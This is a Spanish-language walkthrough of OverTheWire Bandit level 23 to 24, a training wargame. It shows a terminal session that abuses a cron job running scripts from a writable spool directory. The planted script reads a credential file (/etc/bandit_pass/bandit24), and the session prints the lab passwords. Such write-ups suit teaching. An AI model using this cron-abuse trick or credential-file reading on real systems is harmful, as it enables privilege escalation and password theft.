
# Objetivo

Un programa se ejecuta automáticamente a intervalos regulares desde cron, el programador de trabajos basado en el tiempo. Busque en /etc/cron.d/ la configuración y vea qué comando se está ejecutando.

NOTA: Este nivel requiere que cree su propio primer script de shell. ¡Este es un gran paso y deberías estar orgulloso de ti mismo cuando superes este nivel!

NOTA 2: Tenga en cuenta que su script de shell se elimina una vez ejecutado, por lo que es posible que desee conservar una copia...
## Datos de acceso al nivel
Host al que se va a conectar: **bandit.labs.overthewire.org**.
Puerto: **2220**.
Usuario: **bandit23**.
Contraseña: Encontrada en el nivel anterior: `QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G`.

## Solución
```
bandit23@bandit:~$ ls /etc/cron.d/
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ mkdir /tmp/clave_temp
bandit23@bandit:~$ cd /tmp/clave_temp
bandit23@bandit:/tmp/clave_temp$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/clave_temp/password" > me.sh
bandit23@bandit:/tmp/clave_temp$ chmod 777 me.sh
bandit23@bandit:/tmp/clave_temp$ cat me.sh
cat /etc/bandit_pass/bandit24 >> /tmp/clave_temp/password
bandit23@bandit:/tmp/clave_temp$ ls -la me.sh
-rwxrwxrwx 1 bandit23 bandit23 58 Feb 27 01:14 me.sh
bandit23@bandit:/tmp/clave_temp$ touch password
bandit23@bandit:/tmp/clave_temp$ chmod 666 password
bandit23@bandit:/tmp/clave_temp$ ls -la password
-rw-rw-rw- 1 bandit23 bandit23 0 Feb 27 01:16 password
bandit23@bandit:/tmp/clave_temp$ ls -la
total 408
drwxrwxr-x   2 bandit23 bandit23   4096 Feb 27 01:16 .
drwxrwx-wt 429 root     root     405504 Feb 27 01:17 ..
-rwxrwxrwx   1 bandit23 bandit23     58 Feb 27 01:14 me.sh
-rw-rw-rw-   1 bandit23 bandit23      0 Feb 27 01:16 password
bandit23@bandit:/tmp/clave_temp$ cp me.sh /var/spool/bandit24
cp: cannot create regular file '/var/spool/bandit24/me.sh': Operation not permitted
bandit23@bandit:/tmp/clave_temp$ cp me.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/clave_temp$ date
Tue Feb 27 01:18:47 AM UTC 2024
bandit23@bandit:/tmp/clave_temp$ ls -la
total 412
drwxrwxr-x   2 bandit23 bandit23   4096 Feb 27 01:16 .
drwxrwx-wt 430 root     root     405504 Feb 27 01:19 ..
-rwxrwxrwx   1 bandit23 bandit23     58 Feb 27 01:14 me.sh
-rw-rw-rw-   1 bandit23 bandit23     33 Feb 27 01:19 password
bandit23@bandit:/tmp/clave_temp$ ls -l
total 8
-rwxrwxrwx 1 bandit23 bandit23 58 Feb 27 01:14 me.sh
-rw-rw-rw- 1 bandit23 bandit23 33 Feb 27 01:19 password
bandit23@bandit:/tmp/clave_temp$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/clave_temp$ 

```

## Notas adicionales

- `mkdir` -> Crea una carpeta en cierto directorio.
- `touch` -> Crea un archivo vacío en el directorio actual. 
- `chmod` -> Cambia los permisos de algún archivo.
## Referencias

cron, crontab, crontab(5) (use “man 5 crontab” to access this)